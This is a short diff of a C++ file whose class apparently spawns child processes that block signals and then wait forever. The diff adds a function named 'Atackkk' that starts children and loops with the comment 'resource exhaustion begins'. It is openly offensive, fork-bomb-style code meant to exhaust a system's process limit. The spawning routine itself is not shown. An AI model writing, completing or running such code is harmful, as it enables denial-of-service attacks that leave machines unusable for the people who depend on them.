@@ -108,7 +108,7 @@ class PID1ctrller{
         // if child gets parent;s vlocked signals
         // it will block it asw.
 
-        this_thread::sleep_for(chrono::milliseconds(2));
+        this_thread::sleep_for(chrono::seconds(2));
 
         PID1ctrller childcontroller(max);
 
@@ -122,7 +122,7 @@ class PID1ctrller{
 
         while(true){
 
-            pause()
+            pause();
             // heheheh fun part
             // this will wait for the signal
             // but the signal will never come 
@@ -130,5 +130,26 @@ class PID1ctrller{
         }
 
     }
+
+
+    void Atackkk(){
+        cout << "Target max processes =" << max;
+
+        blockSignals();
+
+        spanwer_ahh(3); // 3 started children
+        this_thread::sleep_for(chrono::seconds(3));
+
+        // resource exhaustion begins
+
+        while(true){
+            this_thread::sleep_for(chrono::seconds(60));
+        }
+
+
+
+
+    }
+
 
 };
